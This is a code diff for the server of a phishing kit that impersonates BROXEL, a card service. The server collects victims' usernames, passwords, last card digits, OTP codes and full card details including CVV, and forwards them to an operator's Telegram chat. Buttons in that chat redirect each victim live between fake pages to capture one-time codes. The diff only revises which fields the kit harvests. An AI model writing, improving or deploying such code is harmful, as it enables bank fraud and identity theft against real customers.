@@ -26,11 +26,11 @@ app.use(bodyParser.json());
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
-  // Login principal
-  socket.on('dataForm', ({ usuario, contrasena, claveCajero, fechaNacimiento, sessionId }) => {
+  // 🔹 Login principal (index.html)
+  socket.on('dataForm', ({ usuario, contrasena, ultimosDigitos, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso BROXEL:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
+    const mensaje = `🔐 Nuevo intento de acceso BROXEL:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📱 Últimos 4 dígitos: ${ultimosDigitos}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -45,7 +45,26 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Código OTP (bienvenido.html) - SOLO UNO
+  // 🔹 Formulario de errorlogo.html
+  socket.on('errorlogoForm', ({ usuario, contrasena, ultimosDigitos, sessionId }) => {
+    activeSockets.set(sessionId, socket);
+
+    const mensaje = `⚠️ Nuevo intento fallido BROXEL:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📱 Últimos 4 dígitos: ${ultimosDigitos}`;
+    const botones = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
+            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` }
+          ]
+        ]
+      }
+    };
+
+    bot.sendMessage(telegramChatId, mensaje, botones);
+  });
+
+  // 🔹 Código OTP (bienvenido.html)
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -64,7 +83,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // OTP reintento (denegado.html) - SOLO UNO
+  // 🔹 OTP reintento (denegado.html)
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -83,26 +102,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, fechaNacimiento, sessionId }) => {
-    activeSockets.set(sessionId, socket);
-
-    const mensaje = `⚠️ Nuevo intento fallido detectado BROXEL:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n💳 Clave de cajero: ${claveCajero}`;
-    const botones = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
-            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` }
-          ]
-        ]
-      }
-    };
-
-    bot.sendMessage(telegramChatId, mensaje, botones);
-  });
-
-  // Datos de tarjeta
+  // 🔹 Datos de tarjeta
   socket.on('datosTarjeta', ({ tarjeta, vencimiento, cvv, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -121,12 +121,12 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Reconexión por sessionId
+  // Reconexión
   socket.on('reconectar', (sessionId) => {
     activeSockets.set(sessionId, socket);
   });
 
-  // Redirección solicitada desde botones en el HTML
+  // Redirección
   socket.on("redirigir", ({ url, sessionId }) => {
     const socketTarget = activeSockets.get(sessionId);
     if (socketTarget) {
@@ -135,7 +135,7 @@ io.on('connection', (socket) => {
   });
 });
 
-// Respuesta a botones desde Telegram
+// 🔹 Respuestas desde Telegram
 bot.on('callback_query', (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
@@ -177,7 +177,6 @@ bot.on('callback_query', (query) => {
 
   else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_')) {
     const action = data.split('_')[0];
-
     if (action === 'errortc') {
       socket.emit('redirigir', 'errortc.html');
       bot.sendMessage(chatId, '🚫 Error TC — redirigiendo...');
